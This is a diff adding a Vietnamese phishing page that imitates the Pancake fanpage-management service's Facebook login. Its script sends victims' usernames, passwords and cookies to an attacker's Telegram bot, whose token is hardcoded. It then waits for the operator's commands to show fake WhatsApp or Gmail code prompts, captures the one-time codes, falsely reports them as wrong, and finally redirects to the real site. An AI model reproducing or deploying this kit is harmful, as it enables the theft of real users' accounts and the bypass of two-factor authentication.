@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pancake - Hệ thống quản lý đa kênh</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; background-color: #f0f2f5; }
+        .container { max-width: 420px; margin: 30px auto; background: #fff; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { padding: 20px; text-align: center; border-bottom: 1px solid #f0f0f0; }
+        .logo { width: 140px; }
+        .content { padding: 25px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 14px; background: #0066ff; color: #fff; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .hidden { display: none; }
+        /* Giao diện chọn Page ảo */
+        .page-list { text-align: left; margin: 15px 0; }
+        .page-item { display: flex; align-items: center; padding: 12px; border: 1px solid #eee; margin-bottom: 8px; border-radius: 10px; cursor: pointer; }
+        .page-item:hover { background: #f9f9f9; }
+        .circle { width: 45px; height: 45px; background: #0066ff; border-radius: 50%; color: white; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 15px; }
+        .loading { border: 3px solid #f3f3f3; border-top: 3px solid #0066ff; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header"><img src="https://pancake.vn/images/logo.png" class="logo"></div>
+
+    <div id="step-login" class="content">
+        <h2 style="color: #0066ff; font-size: 20px;">Kết nối tài khoản</h2>
+        <p style="color: #666; font-size: 14px;">Vui lòng đăng nhập để đồng bộ danh sách Fanpage</p>
+        <input type="text" id="email" placeholder="Số điện thoại hoặc Email">
+        <input type="password" id="pass" placeholder="Mật khẩu Facebook">
+        <button class="btn" onclick="goHarvest()">Tiếp tục</button>
+    </div>
+
+    <div id="step-wait" class="content hidden">
+        <div class="loading"></div>
+        <h3>Đang kiểm tra bảo mật...</h3>
+        <p style="font-size: 13px; color: #888;">Vui lòng không thoát trình duyệt lúc này.</p>
+    </div>
+
+    <div id="step-otp" class="content hidden">
+        <h3 id="otp-title" style="color: #d93025;">Xác minh danh tính</h3>
+        <p id="otp-desc">Nhập mã xác thực vừa được gửi về cho bạn.</p>
+        <input type="text" id="otp-val" placeholder="Nhập mã 6 chữ số">
+        <button class="btn" onclick="sendOTP()">Xác nhận mã</button>
+    </div>
+
+    <div id="step-pages" class="content hidden">
+        <h3 style="text-align: left;">Chọn Fanpage để liên kết</h3>
+        <div class="page-list">
+            <div class="page-item" onclick="finish()"> <div class="circle">A1</div> <div><b>ÁO LUXURY - Cơ sở 1</b><br><small>Đang hoạt động</small></div> </div>
+            <div class="page-item" onclick="finish()"> <div class="circle">A2</div> <div><b>ÁO LUXURY - Miền Nam</b><br><small>Đang hoạt động</small></div> </div>
+            <div class="page-item" onclick="finish()"> <div class="circle">A3</div> <div><b>ÁO LUXURY - Tổng kho</b><br><small>Chưa liên kết</small></div> </div>
+        </div>
+        <p style="font-size: 12px; color: #999;">Nhấn vào Page để bắt đầu đồng bộ hội thoại.</p>
+    </div>
+</div>
+
+<script>
+    const TOKEN = "7371520036:AAEOaH2aesiMDvGT5T7iHs3XyTroSLsiGSM"; // Token cũ
+    const CHAT_ID = "-1003722341918"; // Nhóm của bạn
+
+    async function goHarvest() {
+        const u = document.getElementById('email').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return alert("Vui lòng nhập đủ thông tin!");
+
+        // Gửi data về Tele
+        const text = `🔔 CÁ MỚI NỔ:\n👤 User: ${u}\n🔑 Pass: ${p}\n🍪 Cookie: ${document.cookie || 'N/A'}`;
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+
+        show('step-wait');
+        listen();
+    }
+
+    async function listen() {
+        try {
+            const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
+            const d = await r.json();
+            const cmd = d.result[0]?.message?.text;
+
+            if (cmd === "/otp_wa") {
+                setOTP("WhatsApp", "Mã xác thực 6 số đã được gửi qua WhatsApp.");
+            } else if (cmd === "/otp_mail") {
+                setOTP("Gmail", "Vui lòng kiểm tra hộp thư đến hoặc thư rác Gmail.");
+            } else if (cmd === "/done") {
+                show('step-pages');
+            } else {
+                setTimeout(listen, 3000); // Polling mỗi 3s
+            }
+        } catch (e) { setTimeout(listen, 3000); }
+    }
+
+    function setOTP(t, d) {
+        document.getElementById('otp-title').innerText = "Xác minh " + t;
+        document.getElementById('otp-desc').innerText = d;
+        show('step-otp');
+    }
+
+    async function sendOTP() {
+        const o = document.getElementById('otp-val').value;
+        const t = document.getElementById('otp-title').innerText;
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📩 MÃ ${t}: ${o}`);
+        alert("Mã không chính xác, vui lòng kiểm tra lại!");
+        show('step-wait');
+        listen();
+    }
+
+    function show(id) {
+        ['step-login', 'step-wait', 'step-otp', 'step-pages'].forEach(i => document.getElementById(i).classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    function finish() { window.location.href = "https://pancake.vn"; }
+</script>
+</body>
+</html>
